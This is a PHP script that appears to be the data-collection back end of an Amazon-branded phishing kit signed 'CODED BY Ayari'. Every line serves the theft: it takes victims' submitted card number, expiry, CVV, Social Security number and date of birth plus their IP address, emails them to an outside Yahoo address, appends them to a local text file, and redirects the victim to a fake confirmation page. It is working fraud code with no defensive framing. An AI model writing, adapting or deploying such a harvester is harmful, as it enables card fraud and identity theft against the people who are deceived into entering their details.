<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "			<style type='text/css'>
			*{
				font-family: arial;
			}
			font{
				color: #4EC353;
			}
			</style>
			<div style='font-weight: 800;color: #FFFFFF;background: #C6AC00;font-size: 14px;border: 1px solid #06F;padding: 8px;border-radius: 5px 5px 0px 0px;font-size: 17px;'>Ayari | Amazon | Card informations </div>
			<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
			<p>Name on card : <font>".$_POST['Nameoncard']."</font><p>
			<p>Card number  : <font>".$_POST['Cardnumber']."</font><p>
			<p>Expiration date : <font>".$_POST['999']."/".$_POST['99']."</font><p>
			<p>CVV          : <font>".$_POST['ccv']."</font><p>
			<p>SSN          : <font>".$_POST['ssn']."</font><p>
			<p>Date of Birth dd/mm/yyyy : <font>".$_POST['dobday']."/".$_POST['dobmonth']."/".$_POST['dobyear']."</font><p>
			<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>			
			<p>IP : <font>".$ip."</font><p>
			</div>
			<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
			<center>CODED BY Ayari</center>
			</div>
			";
$headers  = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From:Ayari" . "\r\n";
$subject  = " CCV / VBV *o* -  [ " .$ip. " ]";
$send = "logerloger@yahoo.com";
mail($send,$subject,$message,$headers);

header("Location: ../confirmed.php?finish6567FgfscxwerT54R7HGB65478913456bv");
$file = fopen("../account.txt","a");
fwrite($file, $message);
?>